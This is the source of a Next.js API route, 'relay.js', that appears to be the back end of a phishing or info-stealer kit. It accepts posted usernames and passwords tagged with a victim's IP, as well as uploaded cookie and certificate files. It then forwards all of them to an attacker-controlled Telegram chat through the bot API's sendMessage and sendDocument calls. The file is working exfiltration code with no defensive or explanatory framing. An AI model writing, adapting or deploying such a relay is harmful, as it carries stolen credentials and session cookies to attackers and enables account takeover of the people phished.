// api/relay.js
import nextConnect from 'next-connect';
import multer from 'multer';
import { Blob } from 'buffer';

//
// Disable built‐in body parser so we can use multer
//
export const config = {
  api: {
    bodyParser: false,
  },
};

const upload = multer();

const handler = nextConnect({
  onError(error, req, res) {
    console.error('Relay handler error:', error);
    res.status(500).json({ success: false, error: error.message });
  },
  onNoMatch(req, res) {
    res.status(405).json({ success: false, message: 'Method Not Allowed' });
  },
});

//
// Accept either JSON (creds) or a multipart file (cookies / cert)
//
handler.use(upload.single('file'));

handler.post(async (req, res) => {
  const telegramToken = process.env.TELEGRAM_TOKEN;
  const chatId        = process.env.TELEGRAM_CHAT_ID;
  if (!telegramToken || !chatId) {
    console.error('Missing TELEGRAM_TOKEN or TELEGRAM_CHAT_ID env vars');
    return res.status(500).json({ success: false, message: 'Bot not configured' });
  }
  const botUrl = `https://api.telegram.org/bot${telegramToken}`;

  try {
    const contentType = req.headers['content-type'] || '';

    // 🛡️ Credentials JSON payload
    if (contentType.includes('application/json')) {
      const { type, ip, user, pass, data } = req.body;
      // If you sent a free‑form "data" field instead of user/pass:
      const text = data
        ? data
        : `🔑 [${ip}] Credentials\nUser: ${user}\nPass: ${pass}`;

      const tgRes = await fetch(`${botUrl}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text
        })
      });
      if (!tgRes.ok) throw await tgRes.text();
      return res.status(200).json({ success: true });
    }

    // 📂 File payload (cookies or cert)
    if (req.file) {
      // Telegram expects 'document' for files
      const form = new FormData();
      form.append('chat_id', chatId);
      form.append(
        'document',
        new Blob([req.file.buffer], { type: 'text/plain' }),
        req.file.originalname
      );

      const tgRes = await fetch(`${botUrl}/sendDocument`, {
        method: 'POST',
        body: form
      });
      if (!tgRes.ok) throw await tgRes.text();
      return res.status(200).json({ success: true });
    }

    // ❌ Unexpected payload
    res.status(400).json({ success: false, message: 'Bad payload' });
  } catch (err) {
    console.error('Telegram API error:', err);
    res.status(502).json({ success: false, error: String(err) });
  }
});

export default handler;
